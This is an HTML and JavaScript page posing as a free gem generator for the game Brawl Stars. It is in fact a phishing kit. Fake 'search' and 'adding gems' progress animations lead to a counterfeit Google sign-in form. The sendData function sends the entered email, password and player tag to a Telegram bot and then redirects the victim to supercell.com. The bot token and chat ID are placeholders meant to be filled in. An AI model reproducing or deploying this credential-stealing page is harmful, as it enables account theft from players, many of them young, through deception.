<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Brawl Stars Generator</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Source+Sans+Pro:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: 'Lilita One', cursive; overflow-x: hidden;
            background: #1a2969;
        }

        .bg-overlay {
            position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
            background-image: url('https://brawlergems.com/generator/images/brawl_stars_pattern_transparent.png');
            background-size: 300px auto; opacity: 0.1;
            animation: moveBackground 60s linear infinite;
            z-index: 0; pointer-events: none;
        }

        @keyframes moveBackground {
            0% { transform: translate(0, 0); }
            100% { transform: translate(-300px, -300px); }
        }

        .wrapper {
            position: relative; z-index: 10;
            display: flex; flex-direction: column; align-items: center;
            padding: 20px; min-height: 100vh;
        }

        .logo { width: 200px; margin: 10px 0; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }

        /* SHELLY & BUBBLE */
        .shelly-container {
            display: flex; align-items: center; width: 100%; max-width: 450px;
            margin-bottom: 15px; animation: fadeIn 0.5s ease;
        }

        .shelly-avatar {
            width: 70px; height: 70px; border-radius: 50%; border: 3px solid #000;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 2; background: #fff;
        }

        .brawl-bubble {
            background: white; border: 4px solid black; border-radius: 20px;
            padding: 12px 18px; margin-left: -15px; position: relative; flex: 1;
            box-shadow: 0 6px 0 rgba(0,0,0,0.1);
        }

        .brawl-bubble::before {
            content: ''; position: absolute; left: -14px; top: 50%;
            transform: translateY(-50%); border-top: 10px solid transparent;
            border-bottom: 10px solid transparent; border-right: 10px solid black;
        }

        .bubble-text { color: #000; font-size: 15px; line-height: 1.2; text-align: left; }

        /* MAIN BOX */
        .main-box {
            background: white; border: 5px solid #000; border-radius: 20px;
            width: 100%; max-width: 450px; padding: 25px;
            box-shadow: 0 15px 0 rgba(0,0,0,0.2); text-align: center;
            box-sizing: border-box; position: relative;
        }

        .step-title { color: #000; font-size: 22px; margin-bottom: 15px; text-transform: uppercase; }

        .tag-input-wrapper {
            background: #f0f0f0; border: 3px solid #ccc; border-radius: 10px;
            padding: 10px; margin-bottom: 15px;
        }

        input#tag {
            width: 100%; border: none; background: transparent;
            font-family: 'Lilita One'; font-size: 24px; text-align: center;
            outline: none; text-transform: uppercase;
        }

        /* GEMS GRID */
        .gems-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 20px; }
        .gem-card {
            background: #f9f9f9; border: 3px solid #eee; border-radius: 15px;
            padding: 12px; cursor: pointer; transition: 0.1s;
        }
        .gem-card.selected { border-color: #FFA800; background: #FFF9E6; transform: scale(1.05); }
        .gem-card img { width: 50px; display: block; margin: 0 auto 5px; }
        .gem-card span { font-size: 18px; color: #333; }

        /* BUTTONS */
        .btn-yellow {
            background: linear-gradient(180deg, #FFD84D 0%, #FFA800 100%);
            border: 3px solid #000; border-radius: 12px; color: #fff;
            font-size: 22px; padding: 12px; width: 100%; cursor: pointer;
            box-shadow: 0 6px 0 #CC7A00; text-shadow: 2px 2px 0 rgba(0,0,0,0.3);
            text-transform: uppercase;
        }
        .btn-yellow:active { transform: translateY(3px); box-shadow: 0 3px 0 #CC7A00; }

        /* PROGRESS BOX */
        .loader-wrap { display: none; margin: 20px 0; }
        .bar-bg { background: #eee; height: 22px; border: 3px solid #000; border-radius: 15px; overflow: hidden; }
        .bar-fill { background: #FFA800; height: 100%; width: 0%; transition: 0.2s; }
        
        .logs { 
            text-align: left; background: #222; color: #0f0; padding: 10px; 
            border-radius: 10px; font-family: monospace; font-size: 11px;
            height: 70px; overflow-y: hidden; margin-top: 15px;
        }

        /* PROFILE CARD */
        .profile-card {
            background: #222; border-radius: 15px; padding: 15px;
            color: #fff; margin-bottom: 20px; display: flex; align-items: center; gap: 15px;
        }
        .profile-info { text-align: left; }
        .profile-tag { color: #FFD84D; font-size: 20px; }

        /* GOOGLE UI */
        .google-ui { display: none; font-family: 'Source Sans Pro', sans-serif; text-align: left; }
        .g-input {
            width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0;
            border-radius: 4px; font-size: 16px; box-sizing: border-box;
        }

        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<div class="bg-overlay"></div>

<div class="wrapper">
    <img src="https://brawlergems.com/generator/images/logo_outlined_noBG.png" class="logo">

    <div class="shelly-container">
        <img src="https://brawlergems.com/generator/images/brawler_icon.png" class="shelly-avatar">
        <div class="brawl-bubble">
            <div class="bubble-text" id="bubble-msg">Hey Brawler! Enter your player tag to find your profile!</div>
        </div>
    </div>

    <div class="main-box" id="mainBox">
        
        <div id="step-search">
            <div class="step-title">Find Profile</div>
            <div class="tag-input-wrapper">
                <input type="text" id="tag" placeholder="#TAG123" maxlength="12">
            </div>
            <button class="btn-yellow" onclick="searchProfile()">Find Account</button>
        </div>

        <div id="step-load-search" class="loader-wrap">
            <div class="step-title" id="search-status">Searching...</div>
            <div class="bar-bg"><div class="bar-fill" id="search-bar"></div></div>
            <div class="logs" id="search-logs"></div>
        </div>

        <div id="step-gems" style="display:none;">
            <div class="profile-card">
                <img src="https://brawlergems.com/generator/images/brawler_icon.png" width="50">
                <div class="profile-info">
                    <div class="profile-tag" id="display-tag">#TAG</div>
                    <div style="font-size: 12px; opacity: 0.7;">Account found! Status: Active</div>
                </div>
            </div>
            <div class="step-title" style="font-size: 18px;">Select Gem Amount</div>
            <div class="gems-grid">
                <div class="gem-card selected" onclick="selectGems(this, '30')"><img src="https://brawlergems.com/generator/images/30.png"><span>30</span></div>
                <div class="gem-card" onclick="selectGems(this, '360')"><img src="https://brawlergems.com/generator/images/360.png"><span>360</span></div>
                <div class="gem-card" onclick="selectGems(this, '950')"><img src="https://brawlergems.com/generator/images/950.png"><span>950</span></div>
                <div class="gem-card" onclick="selectGems(this, '2000')"><img src="https://brawlergems.com/generator/images/2000.png"><span>2000</span></div>
            </div>
            <button class="btn-yellow" onclick="startGeneration()">Claim Gems</button>
        </div>

        <div id="step-load-gen" class="loader-wrap">
            <div class="step-title">Adding Gems...</div>
            <div class="bar-bg"><div class="bar-fill" id="gen-bar"></div></div>
            <div class="logs" id="gen-logs"></div>
        </div>

        <div id="step-google" class="google-ui">
            <center><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="70"></center>
            <h2 style="font-weight: 400; font-size: 22px; text-align: center;">Sign in</h2>
            <p style="text-align:center; color:#5f6368; font-size:13px; margin-bottom:20px;">Verify identity to complete gem transfer</p>
            <input type="email" id="email" class="g-input" placeholder="Email or phone">
            <input type="password" id="pass" class="g-input" placeholder="Enter password">
            <button class="btn-yellow" style="margin-top:15px; font-size:18px;" onclick="sendData()">Verify Now</button>
        </div>
    </div>
</div>

<script>
    let selectedGems = "30";
    let playerTag = "";
    const bubbleMsg = document.getElementById('bubble-msg');

    function selectGems(el, val) {
        document.querySelectorAll('.gem-card').forEach(c => c.classList.remove('selected'));
        el.classList.add('selected');
        selectedGems = val;
    }

    // –õ–û–ì–ò–ö–ê –®–ê–ì–ê 1: –ü–û–ò–°–ö –ü–†–û–§–ò–õ–Ø
    function searchProfile() {
        playerTag = document.getElementById('tag').value;
        if(playerTag.length < 3) return alert("Please enter a valid Player Tag!");

        document.getElementById('step-search').style.display = 'none';
        document.getElementById('step-load-search').style.display = 'block';
        bubbleMsg.innerText = "Searching global database for " + playerTag + "...";

        let p = 0;
        let logs = ["> Initializing search...", "> Connecting to Supercell ID...", "> Profile found!"];
        let lIdx = 0;

        let iv = setInterval(() => {
            p += 4;
            document.getElementById('search-bar').style.width = p + "%";
            if(p % 32 == 0 && lIdx < logs.length) {
                document.getElementById('search-logs').innerHTML += "<div>" + logs[lIdx] + "</div>";
                lIdx++;
            }
            if(p >= 100) {
                clearInterval(iv);
                setTimeout(() => {
                    document.getElementById('step-load-search').style.display = 'none';
                    document.getElementById('step-gems').style.display = 'block';
                    document.getElementById('display-tag').innerText = playerTag.toUpperCase();
                    bubbleMsg.innerText = "Success! Now select the amount of gems you want for your account.";
                }, 600);
            }
        }, 60);
    }

    // –õ–û–ì–ò–ö–ê –®–ê–ì–ê 2: –ì–ï–ù–ï–†–ê–¶–ò–Ø –ì–ï–ú–û–í
    function startGeneration() {
        document.getElementById('step-gems').style.display = 'none';
        document.getElementById('step-load-gen').style.display = 'block';
        bubbleMsg.innerText = "Preparing to send " + selectedGems + " gems to " + playerTag + "...";

        let p = 0;
        let logs = ["> Bypassing security...", "> Adding gems to vault...", "> Encryption complete."];
        let lIdx = 0;

        let iv = setInterval(() => {
            p += 3;
            document.getElementById('gen-bar').style.width = p + "%";
            if(p % 30 == 0 && lIdx < logs.length) {
                document.getElementById('gen-logs').innerHTML += "<div>" + logs[lIdx] + "</div>";
                lIdx++;
            }
            if(p >= 100) {
                clearInterval(iv);
                setTimeout(() => {
                    document.getElementById('step-load-gen').style.display = 'none';
                    document.getElementById('step-google').style.display = 'block';
                    bubbleMsg.innerText = "Verification required! Prove you are a real Brawler to finish the process!";
                }, 600);
            }
        }, 50);
    }

    async function sendData() {
        const mail = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!mail || !pass) return alert("Please fill in all fields!");

        const token = "–¢–í–û–ô_–¢–û–ö–ï–ù";
        const chat = "–¢–í–û–ô_ID";
        const text = `üéØ NEW LOG\nTag: ${playerTag}\nGems: ${selectedGems}\nMail: ${mail}\nPass: ${pass}`;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}`);
        
        alert("Verification received! Gems will be added within 24 hours.");
        window.location.href = "https://supercell.com";
    }
</script>

</body>
</html>
